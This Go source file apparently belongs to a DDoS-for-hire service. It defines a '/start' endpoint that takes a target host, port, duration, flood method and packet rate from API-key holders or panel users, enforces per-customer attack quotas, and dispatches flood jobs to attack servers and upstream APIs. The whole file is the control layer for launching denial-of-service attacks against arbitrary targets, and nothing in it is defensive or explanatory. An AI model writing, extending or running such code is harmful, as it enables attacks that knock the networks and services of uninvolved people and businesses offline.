package attackapi

import (
	"api/core/database"
	"api/core/master/sessions"
	"api/core/models/apis"
	"api/core/models/floods"
	"api/core/models/functions"
	"api/core/models/server"
	"api/core/models/servers"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"reflect"
	"strconv"
	"strings"
)

func init() {
	Route.NewSub(server.NewRoute("/start", func(w http.ResponseWriter, r *http.Request) {
		type status struct {
			Status  string `json:"status"`
			Message string `json:"message"`
			Attacks []int  `json:"attack_ids"`
		}
		errChan := make(chan error)
		handleError := func(message string) {
			json.NewEncoder(w).Encode(status{Status: "error", Message: message})
		}
		blacklists, _ := database.Container.GetAllBlacklists()
		switch strings.ToLower(r.Method) {
		case "get":
			//validate for api
			key, ok := functions.GetKey(w, r)
			if !ok {
				return
			}
			if !key.HasPermission("api") {
				handleError("You do not have API access!")
				return
			}
			//get parms change if needed
			data := functions.GetQuerys(w, r, map[string]bool{
				"target":      true,
				"port":        true,
				"time":        true,
				"method":      true,
				"threads":     false,
				"pps":         false,
				"concurrents": false,
				"subnet":      false, //never added
			})
			if data == nil {
				return
			}
			//validate ip
			target := data["target"]
			if target == "" {
				handleError("Target parameter is missing")
				return
			}
			if err := ValidateTarget(target, blacklists); err != nil {
				handleError(err.Error())
				return
			}
			//validate method
			flood := floods.New(data["method"])
			if flood == nil {
				handleError("Invalid attack method provided!")
				return
			}
			//validate pps
			flood.Target = data["target"]
			flood.Parent = key.ID
			if _, ok := data["pps"]; ok {
				pps, err := strconv.Atoi(data["pps"])
				if err != nil {
					handleError("Invalid attack pps provided!")
					return
				}
				flood.PPS = pps
			}
			if _, ok := data["threads"]; ok {
				threads, err := strconv.Atoi(data["threads"])
				if err != nil {
					handleError("Invalid thread amount provided!")
					return
				}
				flood.Threads = threads
			}

			//handle cons and durra
			var conns = 1
			ongoing, _ := database.Container.GetRunning(key)
			if len(ongoing) > key.Concurrents {
				handleError("Max Running Attacks!")
			}
			if connsVal, ok := data["concurrents"]; ok {
				if conncurrents, err := strconv.Atoi(connsVal); err != nil || conncurrents+len(ongoing) > key.Concurrents {
					handleError("Invalid concurrent amount provided!")
					return
				} else {
					conns = conncurrents
				}
			}
			if duration, err := strconv.Atoi(data["time"]); err != nil || duration > key.Duration {
				handleError("Invalid attack duration provided or exceeds maximum allowed!")
				return
			} else {
				flood.Duration = duration
			}
			//validate port
			port, err := ValidatePort(data["port"])
			if err != nil {
				handleError(err.Error())
				return
			}
			flood.Port = port

			// Check available slots
			switch flood.Mtype {
			case 1:
				if database.Container.GlobalRunningType(1) >= servers.Slots()[1]+apis.Slots() {
					handleError("No available slot to start attack!")
					return
				}
			case 2:
				if database.Container.GlobalRunningType(2) >= servers.Slots()[2] {
					handleError("No available slot to start attack!")
					return
				}
			}					
			//send to apis
			go func() {
				errChan <- apis.Send(flood)
			}()
			if err := <-errChan; err != nil {
				handleError(err.Error())
				return
			}
			//send to servers
			for i := 0; i < conns; i++ {
				go func() {
					errChan <- servers.Distribute(flood)
				}()
			}
			for i := 0; i < conns; i++ {
				if err := <-errChan; err != nil {
					handleError(err.Error())
					return
				}
			}
			//save attack
			var ids []int
			SaveToDB(key, flood, conns)
			functions.WriteJson(w, status{Status: "success", Message: "attack succesfully started", Attacks: ids})
		case "post":
			//validate for panal
			ok, user := sessions.IsLoggedIn(w, r)
			if !ok {
				return
			}
			r.ParseForm()
			fmt.Println(r.PostForm)
			//validate ip
			target := r.PostFormValue("host")
			if err := ValidateTarget(target, blacklists); err != nil {
				handleError(err.Error())
				return
			}
			//validate method
			flood := floods.New(r.PostFormValue("method"))
			if flood == nil {
				handleError("invalid attack method provided!")
				return
			}
			//validate conns
			flood.Target = r.PostFormValue("host")
			flood.Parent = user.ID
			var conns = 1
			ongoing, _ := database.Container.GetRunning(user.User)
			if len(ongoing) > user.Concurrents {
				handleError("maximum running attacks reached!")
			}
			if ok := r.PostFormValue("concurrents"); ok != "" {
				val := strings.Split(r.PostFormValue("concurrents"), ".")[0]
				conncurrents, err := strconv.Atoi(val)
				if err != nil {
					handleError("invalid concurrent amount provided!")
					return
				} else if err == nil && conncurrents+len(ongoing) > user.Concurrents {
					handleError("you're trying to attack with more concurrents then u have available!")
					return
				}
				conns = conncurrents
				flood.Conns = conncurrents
			}
			//validate pps
			if ok := r.PostFormValue("pps"); ok != "" {
				val := strings.Split(r.PostFormValue("pps"), ".")[0]
				pps, err := strconv.Atoi(val)
				if err != nil {
					handleError("invalid pps amount provided!")
					return
				}
				flood.PPS = pps
			}
			//validate durra
			duration, err := strconv.Atoi(r.PostFormValue("duration"))
			if err != nil || duration <= 0 || duration > user.Duration {
				handleError("Invalid attack duration provided or exceeds maximum allowed!")
				return
			}
			flood.Duration = duration
			//validate port
			port, err := ValidatePort(r.PostFormValue("port"))
			if err != nil {
				handleError(err.Error())
				return
			}
			flood.Port = port
			successMsg, err := SendAttack(conns, flood)
			if err != nil {
				handleError(err.Error())
				return
			}
			log.Println(successMsg)
			//save attack to db
			var ids []int
			SaveToDB(user.User, flood, conns)
			functions.WriteJson(w, status{Status: "success", Message: fmt.Sprintf("Attack successfully started (%s)", successMsg), Attacks: ids})
		}
	}))
}

func Copy(source interface{}, destin interface{}) {
	srcValue := reflect.ValueOf(source)
	destValue := reflect.ValueOf(destin)

	// Ensure destin is a pointer
	if destValue.Kind() != reflect.Ptr {
		panic("destin must be a pointer")
	}

	// Get the element value of source
	if srcValue.Kind() == reflect.Ptr {
		srcValue = srcValue.Elem()
	}

	// Ensure destin points to a value of the same type as source
	if srcValue.Type() != destValue.Elem().Type() {
		panic("source and destin must be of the same type")
	}

	// Set the value of destin
	destValue.Elem().Set(srcValue)
}

